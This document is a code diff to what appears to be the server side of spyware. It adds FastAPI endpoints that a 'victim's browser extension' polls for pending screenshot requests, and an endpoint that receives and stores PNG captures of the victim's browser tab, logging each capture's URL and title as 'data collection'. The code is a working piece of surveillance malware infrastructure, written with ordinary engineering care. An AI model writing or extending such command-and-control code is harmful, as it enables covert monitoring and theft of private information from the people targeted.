@@ -8,18 +8,24 @@ from .private_common import (
     JSONResponse,
     Path,
     SiteInfoRequest,
+    SnapshotUploadRequest,
     UnsafeRemoteURLError,
     UploadValidationError,
     VictimDataRequest,
     add_victim_event,
     asyncio,
     base64,
+    configured_upload_limit,
+    decode_png_image,
     get_victim,
     json,
     logger,
+    os,
     resolve_local_file,
     save_data_collection,
     settings,
+    snapshot_requests,
+    uuid,
     validate_public_http_url,
     validate_transfer_filename,
     verify_victim_api_token,
@@ -204,3 +210,80 @@ async def add_event(
     except Exception:
         logger.exception("Failed to process event for victim %s", victim_id)
         raise HTTPException(status_code=500, detail="Failed to process event")
+
+
+@api_router.get("/sessions/{victim_id}/snapshot-requests")
+async def get_snapshot_requests(
+    victim_id: str,
+    auth: bool = Depends(verify_victim_api_token),
+):
+    """Polled by the victim's browser extension for pending snapshot requests."""
+    pending = await snapshot_requests.pending_for(victim_id)
+    return {"pending": pending or None}
+
+
+@api_router.post("/sessions/{victim_id}/snapshot")
+async def upload_snapshot(
+    victim_id: str,
+    data: SnapshotUploadRequest,
+    auth: bool = Depends(verify_victim_api_token),
+):
+    """Receive a PNG snapshot captured by the victim's browser extension."""
+    try:
+        safe_victim_id = validate_transfer_filename(victim_id)
+    except UploadValidationError as exc:
+        raise HTTPException(status_code=404, detail="Session not found") from exc
+
+    image = decode_png_image(data.image, configured_upload_limit())
+
+    if not await snapshot_requests.claim(safe_victim_id, data.request_id):
+        raise HTTPException(
+            status_code=404,
+            detail="Unknown or expired snapshot request",
+        )
+
+    filename = f"{uuid.uuid4().hex}.png"
+    directory = Path(settings.STORAGE_PATH) / safe_victim_id / "snapshots"
+    try:
+        directory.mkdir(parents=True, exist_ok=True)
+        destination = directory / filename
+        file_descriptor = os.open(
+            destination,
+            os.O_WRONLY | os.O_CREAT | os.O_EXCL,
+            0o600,
+        )
+        with os.fdopen(file_descriptor, "wb") as output:
+            output.write(image)
+    except OSError:
+        logger.exception(
+            "Failed to store snapshot for victim %s",
+            safe_victim_id,
+        )
+        raise HTTPException(status_code=500, detail="Failed to store snapshot")
+
+    relative_path = f"snapshots/{filename}"
+    try:
+        await asyncio.to_thread(
+            save_data_collection,
+            victim_id=safe_victim_id,
+            data_type="screenshot",
+            file_path=relative_path,
+            file_size=len(image),
+            metadata={
+                "url": data.url,
+                "title": data.title,
+                "request_id": data.request_id,
+                "capture_mode": "browser_tab",
+            },
+        )
+    except Exception:
+        logger.exception(
+            "Failed to record snapshot collection for victim %s",
+            safe_victim_id,
+        )
+        raise HTTPException(status_code=502, detail="Failed to record snapshot")
+
+    logger.info(
+        f"📸 Session snapshot stored for victim {safe_victim_id}: {relative_path}"
+    )
+    return {"status": "success", "file_path": relative_path}
